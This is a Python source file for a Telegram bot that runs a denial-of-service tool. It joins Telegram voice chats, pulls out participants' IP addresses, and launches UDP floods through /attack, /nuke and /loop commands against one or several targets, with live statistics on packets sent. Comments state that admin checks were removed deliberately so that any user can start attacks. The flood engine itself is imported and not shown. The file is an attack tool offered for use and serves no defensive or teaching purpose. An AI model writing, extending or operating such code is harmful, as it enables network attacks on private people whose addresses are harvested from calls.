from __future__ import annotations
import asyncio, logging
from enum import Enum
from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.handlers import MessageHandler, CallbackQueryHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from attack_engine import AttackEngine
from vc_detector import VCDetector, VCRecord
from utils import is_valid_port, human_bytes

LOGGER = logging.getLogger(__name__)

class State(str, Enum):
    IDLE = "IDLE"; SCAN = "SCAN"; SELECT = "SELECT"; JOIN = "JOIN"; CONFIRM = "CONFIRM"; ATTACK = "ATTACK"; LOOP = "LOOP"

class BotHandler:
    def __init__(self, bot: Client, detector: VCDetector, engine: AttackEngine, admin_id: int | None, max_dur: int, limit: int):
        self.bot = bot; self.detector = detector; self.engine = engine; self.admin = admin_id; self.max_dur = max_dur; self.limit = limit
        self.state = State.IDLE
        self.records = []
        self.selected = None
        self.target_ip = None; self.target_port = 0
        self.loop_active = False; self.loop_count = 0; self.loop_iter = 0
        self.progress_task = None

        # Register commands
        bot.add_handler(MessageHandler(self.cmd_start, filters.command("start")))
        bot.add_handler(MessageHandler(self.cmd_scan, filters.command("scan")))
        bot.add_handler(MessageHandler(self.cmd_attack, filters.command("attack")))
        bot.add_handler(MessageHandler(self.cmd_nuke, filters.command("nuke")))
        bot.add_handler(MessageHandler(self.cmd_loop, filters.command("loop")))
        bot.add_handler(MessageHandler(self.cmd_stop, filters.command("stop")))
        bot.add_handler(MessageHandler(self.cmd_status, filters.command("status")))
        bot.add_handler(CallbackQueryHandler(self.on_callback))

    async def cmd_start(self, client, msg):
        # NO ADMIN CHECK — Sabko allow
        await msg.reply("✅ Bot is active!\nCommands: /scan, /attack, /nuke, /loop, /stop, /status")

    async def cmd_scan(self, client, msg):
        # NO ADMIN CHECK
        if self.state not in (State.IDLE, State.SCAN):
            await msg.reply(f"Busy: {self.state}. Use /stop")
            return
        self.state = State.SCAN
        status = await msg.reply("🔎 Scanning VCs...")
        try:
            self.records = await self.detector.scan(limit=self.limit)
        except Exception as e:
            await status.edit(f"❌ Scan error: {e}")
            self.state = State.IDLE; return
        if not self.records:
            await status.edit("No active VCs. Start a voice chat first.")
            self.state = State.IDLE; return
        buttons = [[InlineKeyboardButton(f"{i+1}. {r.title[:30]}", callback_data=f"sel:{i}")] for i,r in enumerate(self.records)]
        await status.edit(f"✅ Found {len(self.records)} VCs. Select:", reply_markup=InlineKeyboardMarkup(buttons))
        self.state = State.SELECT

    async def cmd_attack(self, client, msg):
        # NO ADMIN CHECK
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply("Usage: /attack <ip> <port> [duration]")
            return
        ip, port = parts[1], int(parts[2])
        dur = int(parts[3]) if len(parts)>3 else 30
        dur = min(dur, self.max_dur)
        if not is_valid_port(port):
            await msg.reply("Invalid port")
            return
        await self._start_attack(msg.chat.id, ip, port, dur)

    async def cmd_nuke(self, client, msg):
        # NO ADMIN CHECK
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply("Usage: /nuke <ip:port> [ip:port ...] <duration>")
            return
        targets = []
        dur = 30
        for p in parts[1:]:
            if ":" in p:
                ip, port_str = p.rsplit(":",1)
                try:
                    port = int(port_str)
                    if is_valid_port(port):
                        targets.append((ip, port))
                except: pass
            else:
                try:
                    dur = int(p)
                except: pass
        if not targets:
            await msg.reply("No valid targets")
            return
        dur = min(dur, self.max_dur)
        await msg.reply(f"💥 NUKING {len(targets)} targets for {dur}s")
        tasks = []
        for ip, port in targets:
            tasks.append(self._start_attack(msg.chat.id, ip, port, dur, silent=True))
        await asyncio.gather(*tasks, return_exceptions=True)
        await msg.reply(f"✅ Nuke completed on {len(targets)} targets.")

    async def cmd_loop(self, client, msg):
        # NO ADMIN CHECK
        parts = msg.text.split()
        if len(parts) < 5:
            await msg.reply("Usage: /loop <ip> <port> <duration> <iterations>")
            return
        ip, port, dur, iters = parts[1], int(parts[2]), int(parts[3]), int(parts[4])
        if not is_valid_port(port) or dur <=0 or iters <=0:
            await msg.reply("Invalid")
            return
        dur = min(dur, self.max_dur); iters = min(iters, 50)
        self.loop_active = True; self.loop_iter = iters; self.loop_count = 0
        status = await msg.reply(f"🔄 Loop {iters} rounds on {ip}:{port} ({dur}s each)")
        for i in range(iters):
            if not self.loop_active: break
            self.loop_count = i+1
            await status.edit(f"Round {i+1}/{iters} ...")
            await self._start_attack(msg.chat.id, ip, port, dur, silent=True)
            await asyncio.sleep(1.5)
        self.loop_active = False; self.state = State.IDLE
        await status.edit(f"✅ Loop finished ({iters} rounds)")

    async def cmd_stop(self, client, msg):
        # NO ADMIN CHECK
        self.engine.stop()
        self.loop_active = False
        if self.progress_task:
            self.progress_task.cancel()
            self.progress_task = None
        if self.selected:
            await self.detector.leave(self.selected)
        self.state = State.IDLE
        await msg.reply("🛑 Halt – everything stopped.")

    async def cmd_status(self, client, msg):
        # NO ADMIN CHECK
        await msg.reply(
            f"State: {self.state}\n"
            f"Target: {self.target_ip}:{self.target_port}\n"
            f"Loop: {self.loop_count}/{self.loop_iter}\n"
            f"Stats: sent={self.engine.stats.sent}, fail={self.engine.stats.failed}, rps={self.engine.stats.rps:.1f}"
        )

    async def on_callback(self, client, cb):
        # NO ADMIN CHECK
        data = cb.data
        if data.startswith("sel:"):
            idx = int(data.split(":")[1])
            self.selected = self.records[idx]
            await cb.message.edit_text(f"Selected: {self.selected.title}\nProceed?",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ JOIN & EXTRACT", callback_data="join")],
                                                   [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]]))
            await cb.answer()
        elif data == "join":
            await cb.message.edit_text("⏳ Joining and extracting...")
            await cb.answer()
            try:
                meta = await self.detector.extract(self.selected)
                ips = meta.get("extracted_ips", [])
                if not ips:
                    await cb.message.edit_text("No IPs found. Use /attack manually.")
                    self.state = State.IDLE; return
                self.target_ip = ips[0]["ip"]
                self.target_port = ips[0]["port"] or 10001
                lines = "\n".join([f"• {x['ip']}:{x['port']}" for x in ips[:5]])
                await cb.message.edit_text(
                    f"✅ Extracted IPs:\n{lines}\n\nAttack now?",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🚀 ATTACK", callback_data="attack")],
                        [InlineKeyboardButton("🚪 LEAVE", callback_data="leave")]
                    ])
                )
                self.state = State.CONFIRM
            except Exception as e:
                await cb.message.edit_text(f"Extraction error: {e}")
                self.state = State.IDLE
        elif data == "attack":
            await cb.answer("Launching...")
            await self._start_attack(cb.message.chat.id, self.target_ip, self.target_port, self.max_dur//2)
        elif data == "leave":
            await self.detector.leave(self.selected)
            await cb.message.edit_text("Left VC.")
            self.state = State.IDLE
            await cb.answer()
        elif data == "cancel":
            self.state = State.IDLE
            await cb.message.edit_text("Cancelled.")
            await cb.answer()
        elif data == "global_stop":
            self.engine.stop()
            self.loop_active = False
            await cb.answer("Stopped!")

    async def _start_attack(self, chat_id, ip, port, duration, silent=False):
        self.state = State.ATTACK
        if not silent:
            dash = await self.bot.send_message(chat_id, f"🔥 Attacking {ip}:{port} for {duration}s")
            self.progress_task = asyncio.create_task(self._progress(dash.chat.id, dash.id, ip, port))
        try:
            stats = await self.engine.run_udp(ip, port, duration)
            result = f"✅ {ip}:{port} – sent {stats.sent}, fail {stats.failed}, {human_bytes(stats.bytes)}, RPS {stats.rps:.1f}"
            if not silent:
                await dash.edit_text(result)
            else:
                await self.bot.send_message(chat_id, result)
        except Exception as e:
            if not silent:
                await dash.edit_text(f"❌ Attack error: {e}")
            else:
                await self.bot.send_message(chat_id, f"❌ {ip}:{port} error: {e}")
        finally:
            if self.progress_task and not silent:
                self.progress_task.cancel()
                self.progress_task = None
            self.state = State.IDLE if not self.loop_active else State.LOOP

    async def _progress(self, chat_id, msg_id, ip, port):
        while True:
            await asyncio.sleep(3)
            stats = self.engine.stats
            if not stats.running:
                break
            try:
                await self.bot.edit_message_text(
                    chat_id, msg_id,
                    f"⚡ {ip}:{port}\nSent: {stats.sent} | Fail: {stats.failed}\nData: {human_bytes(stats.bytes)}\nRPS: {stats.rps:.1f}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="global_stop")]])
                )
            except: pass
